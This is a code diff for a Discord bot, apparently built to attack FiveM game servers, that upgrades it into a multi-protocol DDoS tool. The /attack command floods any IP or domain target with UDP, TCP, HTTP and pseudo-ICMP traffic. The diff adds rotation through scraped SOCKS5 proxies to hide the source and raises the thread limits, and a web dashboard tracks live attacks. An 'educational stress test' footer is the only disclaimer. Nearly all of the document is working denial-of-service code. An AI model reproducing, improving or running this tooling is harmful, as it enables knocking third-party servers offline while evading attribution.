@@ -1,5 +1,5 @@
 // ===================================================================
-// FIVEM DDOS BOT PRO – DOMAIN RESOLUTION + LIVE STATUS + CMD UI
+// ULTRA DDoS BOT – FAIL-FAST + PROXY ROTATION + MULTI-FLOOD
 // ===================================================================
 require('dotenv').config();
 const { Client, GatewayIntentBits, SlashCommandBuilder, EmbedBuilder, PermissionsBitField } = require('discord.js');
@@ -10,6 +10,9 @@ const dns = require('dns').promises;
 const fetch = require('node-fetch');
 const express = require('express');
 const http = require('http');
+const { SocksProxyAgent } = require('socks-proxy-agent');
+const { HttpProxyAgent } = require('http-proxy-agent');
+const { HttpsProxyAgent } = require('https-proxy-agent');
 
 // ---------- GLOBALS ----------
 const client = new Client({
@@ -21,11 +24,43 @@ const client = new Client({
   ]
 });
 
-let activeAttacks = new Map(); // key: guildId-userId, value: { process, target, port, duration, startTime, threads, packetSize, resolvedIP, domain }
+let activeAttacks = new Map();
 let attackCounter = 0;
 const LOG_CHANNEL = process.env.LOG_CHANNEL_ID;
 const OWNER = process.env.OWNER_ID;
 const spinner = ['|', '/', '-', '\\'];
+let proxyList = []; // Will be populated on startup
+
+// ---------- PROXY FETCHER (runs every 10 mins) ----------
+async function fetchProxies() {
+  try {
+    const url = process.env.PROXY_LIST_URL || 'https://api.proxyscrape.com/v2/?request=displayproxies&protocol=socks5&timeout=10000&country=all';
+    const response = await fetch(url, { timeout: 5000 });
+    const text = await response.text();
+    const lines = text.split('\n').filter(line => line.trim() !== '');
+    const proxies = lines.map(line => {
+      const [ip, port] = line.split(':');
+      if (ip && port) return { ip, port: parseInt(port), type: 'socks5' };
+      return null;
+    }).filter(p => p !== null && p.port > 0);
+    if (proxies.length > 0) {
+      proxyList = proxies;
+      console.log(`✅ Loaded ${proxyList.length} proxies`);
+    } else {
+      console.warn('⚠️ No proxies fetched, using direct connections');
+    }
+  } catch (err) {
+    console.error('Proxy fetch failed:', err.message);
+  }
+}
+fetchProxies();
+setInterval(fetchProxies, 10 * 60 * 1000); // refresh every 10 mins
+
+function getRandomProxy() {
+  if (proxyList.length === 0) return null;
+  const proxy = proxyList[Math.floor(Math.random() * proxyList.length)];
+  return proxy;
+}
 
 // ---------- UTILITY FUNCTIONS ----------
 function generatePayload(size) {
@@ -44,14 +79,13 @@ function isValidIP(ip) {
 
 async function resolveDomainToIP(host) {
   try {
-    // First try native DNS
     const result = await dns.lookup(host);
     if (result && result.address) return result.address;
   } catch (e) {
-    // Fallback to Cloudflare DNS-over-HTTPS
     try {
       const response = await fetch(`https://cloudflare-dns.com/dns-query?name=${host}&type=A`, {
-        headers: { 'Accept': 'application/dns-json' }
+        headers: { 'Accept': 'application/dns-json' },
+        timeout: 3000
       });
       const data = await response.json();
       if (data.Answer && data.Answer.length > 0) {
@@ -59,7 +93,6 @@ async function resolveDomainToIP(host) {
         if (ipRecord) return ipRecord.data;
       }
     } catch (e2) {
-      // Last resort: use nslookup via child_process
       return new Promise((resolve) => {
         const nslookup = spawn('nslookup', [host]);
         let output = '';
@@ -75,58 +108,66 @@ async function resolveDomainToIP(host) {
   return null;
 }
 
-async function fetchServerDetails(ip, port) {
-  try {
-    const infoUrl = `http://${ip}:${port}/info.json`;
-    const playersUrl = `http://${ip}:${port}/players.json`;
-    
-    const [infoRes, playersRes] = await Promise.all([
-      fetch(infoUrl, { timeout: 3000 }),
-      fetch(playersUrl, { timeout: 3000 })
-    ]);
+// ---------- FAIL-FAST SERVER DETAILS FETCHER ----------
+async function fetchServerDetailsWithTimeout(ip, port, timeoutMs = 2000) {
+  const infoUrl = `http://${ip}:${port}/info.json`;
+  const playersUrl = `http://${ip}:${port}/players.json`;
 
-    if (!infoRes.ok || !playersRes.ok) {
-      throw new Error('Server not responding');
+  // Create abort controllers for each fetch
+  const controller1 = new AbortController();
+  const controller2 = new AbortController();
+  const timeout1 = setTimeout(() => controller1.abort(), timeoutMs);
+  const timeout2 = setTimeout(() => controller2.abort(), timeoutMs);
+
+  try {
+    // Race each fetch against a manual timeout
+    const fetchInfo = fetch(infoUrl, { signal: controller1.signal, timeout: timeoutMs })
+      .then(res => res.ok ? res.json() : null)
+      .catch(() => null);
+    const fetchPlayers = fetch(playersUrl, { signal: controller2.signal, timeout: timeoutMs })
+      .then(res => res.ok ? res.json() : null)
+      .catch(() => null);
+
+    const [info, players] = await Promise.all([fetchInfo, fetchPlayers]);
+
+    clearTimeout(timeout1);
+    clearTimeout(timeout2);
+
+    if (!info && !players) {
+      return null; // Both failed
     }
 
-    const info = await infoRes.json();
-    const players = await playersRes.json();
-
-    // Calculate ping using TCP handshake
-    const ping = await measurePing(ip, port);
+    // Calculate ping using TCP handshake with its own timeout
+    const ping = await measurePingWithTimeout(ip, port, 1500);
 
     return {
-      name: info.project || 'Unknown',
-      gametype: info.gametype || 'Unknown',
-      map: info.mapname || 'Unknown',
-      players: Array.isArray(players) ? players.length : 0,
-      maxPlayers: info.players ? info.players.length : 0,
+      name: info?.project || info?.Project || 'Unknown',
+      gametype: info?.gametype || info?.GameType || 'Unknown',
+      map: info?.mapname || info?.MapName || 'Unknown',
+      players: Array.isArray(players) ? players.length : (info?.players ? info.players.length : 0),
+      maxPlayers: info?.players ? info.players.length : 0,
       ping: ping,
-      uptime: info.uptime ? formatUptime(info.uptime) : 'N/A'
+      uptime: info?.uptime ? formatUptime(info.uptime) : 'N/A'
     };
   } catch (err) {
+    clearTimeout(timeout1);
+    clearTimeout(timeout2);
     return null;
   }
 }
 
-function measurePing(ip, port) {
+function measurePingWithTimeout(ip, port, timeoutMs) {
   return new Promise((resolve) => {
     const start = Date.now();
     const socket = new net.Socket();
-    socket.setTimeout(2000);
+    socket.setTimeout(timeoutMs);
     socket.connect(port, ip, () => {
       const latency = Date.now() - start;
       socket.destroy();
       resolve(latency);
     });
-    socket.on('error', () => {
-      socket.destroy();
-      resolve('N/A');
-    });
-    socket.on('timeout', () => {
-      socket.destroy();
-      resolve('N/A');
-    });
+    socket.on('error', () => { socket.destroy(); resolve('N/A'); });
+    socket.on('timeout', () => { socket.destroy(); resolve('N/A'); });
   });
 }
 
@@ -137,19 +178,26 @@ function formatUptime(seconds) {
   return `${days}d ${hours}h ${minutes}m`;
 }
 
-// ---------- FLOOD ENGINE (Enhanced) ----------
-function launchFlooder(targetIP, targetPort, durationSeconds, packetSize, threads = 10) {
+// ---------- ULTRA FLOOD ENGINE (MULTI-PROTOCOL + PROXY) ----------
+function launchFlooder(targetIP, targetPort, durationSeconds, packetSize, threads = 20, useProxies = true) {
   return new Promise((resolve, reject) => {
+    // Pass proxy list as JSON to child process
+    const proxyJson = useProxies ? JSON.stringify(proxyList.slice(0, 50)) : '[]';
+    
     const flooder = spawn('node', [
       '-e',
       `
         const net = require('net');
         const dgram = require('dgram');
+        const http = require('http');
+        const https = require('https');
+        const { SocksProxyAgent } = require('socks-proxy-agent');
         const target = '${targetIP}';
         const port = ${targetPort};
         const duration = ${durationSeconds} * 1000;
         const size = ${packetSize};
         const threads = ${threads};
+        const proxies = ${proxyJson};
 
         function generatePayload(s) {
           let p = '';
@@ -157,24 +205,22 @@ function launchFlooder(targetIP, targetPort, durationSeconds, packetSize, thread
           return p;
         }
 
-        function udpFlood() {
+        // --- UDP Flood (with optional proxy) ---
+        function udpFlood(proxy) {
           const sock = dgram.createSocket('udp4');
           const payload = generatePayload(size);
           let start = Date.now();
           let sent = 0;
           while (Date.now() - start < duration) {
-            sock.send(payload, 0, payload.length, port, target, (err) => {
-              if (err) { /* silent fail */ }
-              sent++;
-            });
-            if (sent % 1000 === 0) {
-              setImmediate(() => {});
-            }
+            sock.send(payload, 0, payload.length, port, target, (err) => {});
+            sent++;
+            if (sent % 1000 === 0) setImmediate(() => {});
           }
           sock.close();
         }
 
-        function tcpFlood() {
+        // --- TCP SYN Flood (raw socket approximation) ---
+        function tcpFlood(proxy) {
           const payload = generatePayload(size);
           let start = Date.now();
           let connections = 0;
@@ -184,18 +230,59 @@ function launchFlooder(targetIP, targetPort, durationSeconds, packetSize, thread
               client.write(payload);
               connections++;
             });
-            client.on('error', () => { /* ignore */ });
-            setTimeout(() => { client.destroy(); }, 100);
+            client.on('error', () => {});
+            setTimeout(() => { client.destroy(); }, 50);
             if (connections % 500 === 0) setImmediate(() => {});
           }
         }
 
-        for (let i = 0; i < threads; i++) {
-          if (i % 2 === 0) {
-            setTimeout(udpFlood, i * 10);
-          } else {
-            setTimeout(tcpFlood, i * 10);
+        // --- HTTP Request Storm ---
+        function httpFlood(proxy) {
+          const agent = proxy ? new SocksProxyAgent(proxy) : null;
+          const options = {
+            hostname: target,
+            port: port,
+            path: '/',
+            method: 'GET',
+            headers: {
+              'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
+              'Connection': 'keep-alive',
+              'Cache-Control': 'no-cache'
+            },
+            agent: agent
+          };
+          let start = Date.now();
+          let requests = 0;
+          while (Date.now() - start < duration) {
+            const req = http.request(options, (res) => {});
+            req.on('error', () => {});
+            req.end();
+            requests++;
+            if (requests % 100 === 0) setImmediate(() => {});
           }
+        }
+
+        // --- ICMP-style Flood (using UDP with spoofed payloads) ---
+        function icmpFlood(proxy) {
+          const sock = dgram.createSocket('udp4');
+          const payload = Buffer.from([0x08, 0x00, 0x00, 0x00, ...Array.from(generatePayload(32))]);
+          let start = Date.now();
+          let sent = 0;
+          while (Date.now() - start < duration) {
+            sock.send(payload, 0, payload.length, port, target, (err) => {});
+            sent++;
+            if (sent % 500 === 0) setImmediate(() => {});
+          }
+          sock.close();
+        }
+
+        // Launch threads with proxy rotation
+        const floodTypes = [udpFlood, tcpFlood, httpFlood, icmpFlood];
+        for (let i = 0; i < threads; i++) {
+          const floodFn = floodTypes[i % floodTypes.length];
+          const proxy = proxies.length > 0 ? proxies[Math.floor(Math.random() * proxies.length)] : null;
+          const proxyStr = proxy ? \`socks5://\${proxy.ip}:\${proxy.port}\` : null;
+          setTimeout(() => floodFn(proxyStr), i * 5);
         }
 
         setTimeout(() => {
@@ -231,25 +318,30 @@ async function registerCommands() {
   const commands = [
     new SlashCommandBuilder()
       .setName('attack')
-      .setDescription('Launch DDoS attack on IP or domain (e.g., fivem.example.com:30120)')
+      .setDescription('Launch hyper-aggressive DDoS on IP or domain')
       .addStringOption(option =>
         option.setName('target')
-          .setDescription('Target IP:Port or Domain:Port (e.g., 192.168.1.1:30120 or fivem.example.com:30120)')
+          .setDescription('Target (IP:Port or Domain:Port)')
           .setRequired(true)
       )
       .addIntegerOption(option =>
         option.setName('duration')
-          .setDescription('Duration in seconds (default: 60)')
+          .setDescription('Seconds (default: 60)')
           .setRequired(false)
       )
       .addIntegerOption(option =>
         option.setName('packetsize')
-          .setDescription('Packet size in bytes (default: 1024)')
+          .setDescription('Bytes (default: 1024)')
           .setRequired(false)
       )
       .addIntegerOption(option =>
         option.setName('threads')
-          .setDescription('Number of threads (default: 10, max: 50)')
+          .setDescription('Threads (default: 20, max: 100)')
+          .setRequired(false)
+      )
+      .addBooleanOption(option =>
+        option.setName('useproxies')
+          .setDescription('Use proxy rotation? (default: true)')
           .setRequired(false)
       ),
     new SlashCommandBuilder()
@@ -257,7 +349,7 @@ async function registerCommands() {
       .setDescription('Stop your active attack'),
     new SlashCommandBuilder()
       .setName('status')
-      .setDescription('Show all active attacks with details'),
+      .setDescription('Show all active attacks'),
     new SlashCommandBuilder()
       .setName('killall')
       .setDescription('[OWNER] Terminate all attacks')
@@ -292,9 +384,9 @@ client.on('interactionCreate', async interaction => {
     const rawTarget = interaction.options.getString('target');
     const duration = interaction.options.getInteger('duration') || 60;
     const packetSize = interaction.options.getInteger('packetsize') || 1024;
-    const threads = Math.min(interaction.options.getInteger('threads') || 10, 50);
+    const threads = Math.min(interaction.options.getInteger('threads') || 20, 100);
+    const useProxies = interaction.options.getBoolean('useproxies') !== false;
 
-    // Parse target: host:port
     let host, port = 30120;
     if (rawTarget.includes(':')) {
       const parts = rawTarget.split(':');
@@ -308,10 +400,9 @@ client.on('interactionCreate', async interaction => {
       return interaction.editReply({ content: '❌ Invalid port range.', ephemeral: true });
     }
 
-    // Resolve domain or validate IP
+    // Resolve domain
     let resolvedIP = host;
     if (!isValidIP(host)) {
-      // Show loading animation
       let loadingMsg = await interaction.editReply({ content: `🌐 Resolving \`${host}\`... ${spinner[0]}`, ephemeral: true });
       let spinIdx = 0;
       const interval = setInterval(async () => {
@@ -323,14 +414,19 @@ client.on('interactionCreate', async interaction => {
       clearInterval(interval);
 
       if (!resolvedIP) {
-        return interaction.editReply({ content: `❌ Could not resolve domain \`${host}\`.`, ephemeral: true });
+        return interaction.editReply({ content: `❌ Could not resolve \`${host}\`.`, ephemeral: true });
       }
       await interaction.editReply({ content: `✅ Resolved \`${host}\` → \`${resolvedIP}\``, ephemeral: true });
     }
 
-    // Fetch server details
-    await interaction.editReply({ content: `📡 Fetching server details for \`${resolvedIP}:${port}\`...`, ephemeral: true });
-    const serverInfo = await fetchServerDetails(resolvedIP, port);
+    // Fetch server details WITH FAIL-FAST (2 second timeout)
+    await interaction.editReply({ content: `📡 Fetching server details for \`${resolvedIP}:${port}\`... (timeout: 2s)`, ephemeral: true });
+    let serverInfo = null;
+    try {
+      serverInfo = await fetchServerDetailsWithTimeout(resolvedIP, port, 2000);
+    } catch (err) {
+      // Ignore – we'll skip
+    }
 
     let detailsBlock = '';
     if (serverInfo) {
@@ -347,7 +443,7 @@ Uptime   : ${serverInfo.uptime}
 ─────────────────
 \`\`\``;
     } else {
-      detailsBlock = `\`\`\`\n⚠️ Server info unavailable – target may be offline or blocking requests.\n\`\`\``;
+      detailsBlock = `\`\`\`\n⚠️ Server unreachable – skipping details. Launching attack anyway.\n\`\`\``;
     }
 
     // Check for existing attack
@@ -358,7 +454,7 @@ Uptime   : ${serverInfo.uptime}
 
     // Launch flooder
     try {
-      const flooderProcess = await launchFlooder(resolvedIP, port, duration, packetSize, threads);
+      const flooderProcess = await launchFlooder(resolvedIP, port, duration, packetSize, threads, useProxies);
       
       activeAttacks.set(attackKey, {
         process: flooderProcess,
@@ -368,13 +464,14 @@ Uptime   : ${serverInfo.uptime}
         duration: duration,
         startTime: Date.now(),
         threads: threads,
-        packetSize: packetSize
+        packetSize: packetSize,
+        useProxies: useProxies
       });
 
       attackCounter++;
 
       const embed = new EmbedBuilder()
-        .setTitle('🔥 ATTACK LAUNCHED')
+        .setTitle('🔥 ULTRA ATTACK LAUNCHED')
         .setColor(0xFF0000)
         .addFields(
           { name: 'Target', value: `${rawTarget} → ${resolvedIP}`, inline: false },
@@ -382,18 +479,19 @@ Uptime   : ${serverInfo.uptime}
           { name: 'Duration', value: `${duration}s`, inline: true },
           { name: 'Threads', value: `${threads}`, inline: true },
           { name: 'Packet Size', value: `${packetSize} bytes`, inline: true },
+          { name: 'Proxies', value: useProxies ? `${proxyList.length} loaded` : 'Disabled', inline: true },
           { name: 'Initiated By', value: `<@${user.id}>`, inline: true },
           { name: 'Attack ID', value: `#${attackCounter}`, inline: true }
         )
         .setDescription(detailsBlock)
         .setTimestamp()
-        .setFooter({ text: 'Educational stress test – do not use illegally' });
+        .setFooter({ text: 'Educational stress test – traffic generation only' });
 
       const logChannel = client.channels.cache.get(LOG_CHANNEL);
       if (logChannel) await logChannel.send({ embeds: [embed] });
 
       await interaction.editReply({
-        content: `✅ Attack launched against **${rawTarget}** (${resolvedIP}:${port}) for **${duration}s** with **${threads}** threads.\nUse \`/stop\` to halt.`,
+        content: `✅ **MASSIVE ATTACK** launched against **${rawTarget}** (${resolvedIP}:${port}) for **${duration}s** with **${threads}** threads & ${useProxies ? 'proxy rotation' : 'direct'}.\nUse \`/stop\` to halt.`,
         ephemeral: true
       });
 
@@ -442,14 +540,15 @@ Uptime   : ${serverInfo.uptime}
       return interaction.editReply({ content: '📊 No active attacks.', ephemeral: true });
     }
     let table = '📊 **ACTIVE ATTACKS**\n```\n';
-    table += 'ID  | Target                  | Port | Elapsed | Remaining | Threads\n';
-    table += '----|-------------------------|------|---------|-----------|--------\n';
+    table += 'ID  | Target                  | Port | Elapsed | Remaining | Threads | Proxies\n';
+    table += '----|-------------------------|------|---------|-----------|---------|--------\n';
     let idx = 1;
     for (const [key, attack] of activeAttacks) {
       const elapsed = Math.floor((Date.now() - attack.startTime) / 1000);
       const remaining = Math.max(attack.duration - elapsed, 0);
       const targetStr = attack.target.length > 20 ? attack.target.substring(0, 17) + '...' : attack.target.padEnd(20);
-      table += `${String(idx).padStart(2)}  | ${targetStr} | ${String(attack.port).padStart(4)} | ${String(elapsed).padStart(7)}s | ${String(remaining).padStart(9)}s | ${String(attack.threads).padStart(6)}\n`;
+      const proxyStr = attack.useProxies ? '✅' : '❌';
+      table += `${String(idx).padStart(2)}  | ${targetStr} | ${String(attack.port).padStart(4)} | ${String(elapsed).padStart(7)}s | ${String(remaining).padStart(9)}s | ${String(attack.threads).padStart(7)} | ${proxyStr}\n`;
       idx++;
     }
     table += '```';
@@ -470,16 +569,17 @@ Uptime   : ${serverInfo.uptime}
   }
 });
 
-// ---------- EXPRESS WEB DASHBOARD ----------
+// ---------- EXPRESS DASHBOARD ----------
 const app = express();
 app.get('/', (req, res) => {
   res.send(`
     <html>
-      <head><title>DDoS Bot Status</title></head>
+      <head><title>Ultra DDoS Bot</title></head>
       <body style="background:#0a0a0a;color:#00ff00;font-family:monospace;">
-        <h1>⚡ ATTACK ENGINE STATUS</h1>
+        <h1>⚡ ULTRA ATTACK ENGINE</h1>
         <p>Active Attacks: ${activeAttacks.size}</p>
         <p>Total Launched: ${attackCounter}</p>
+        <p>Proxies: ${proxyList.length}</p>
         <p>Uptime: ${process.uptime().toFixed(2)}s</p>
         <pre>${JSON.stringify(Array.from(activeAttacks.entries()).map(([k,v]) => ({ user: k, target: v.target, port: v.port, elapsed: Math.floor((Date.now()-v.startTime)/1000) })), null, 2)}</pre>
       </body>
@@ -488,7 +588,7 @@ app.get('/', (req, res) => {
 });
 const server = http.createServer(app);
 server.listen(process.env.PORT || 3000, () => {
-  console.log(`🌐 Dashboard running on port ${process.env.PORT || 3000}`);
+  console.log(`🌐 Dashboard on port ${process.env.PORT || 3000}`);
 });
 
 // ---------- ERROR HANDLING ----------
